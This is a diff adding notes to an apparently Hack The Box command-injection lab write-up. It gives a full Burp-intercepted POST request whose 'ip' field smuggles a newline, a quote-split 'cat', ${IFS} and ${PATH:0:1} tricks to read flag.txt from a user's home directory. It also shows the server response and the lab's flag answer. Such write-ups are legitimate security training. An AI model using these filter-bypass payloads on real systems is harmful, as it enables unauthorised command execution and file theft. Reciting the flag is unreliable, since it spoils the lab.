@@ -54,3 +54,40 @@ SYNTAX:
 C:\htb> who^ami
 
 21y4d
+
+
+
+CHALLENGE: 94.237.54.190:58820
+
+Question 1 -  Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. - HTB{b451c_f1l73r5_w0n7_570p_m3}
+1. 94.237.54.190:58820+
+2. open burp and enable proxy on web browser 
+3. intercept a POST request just typing in any IP to the host check form
+4. inside of burp change the request to -> %0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt so full request looks like -> 
+POST / HTTP/1.1
+Host: 94.237.54.190:58820
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.54.190:58820/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+Origin: http://94.237.54.190:58820
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+
+5. Response ->    <pre>
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+HTB{b451c_f1l73r5_w0n7_570p_m3}
+</pre>
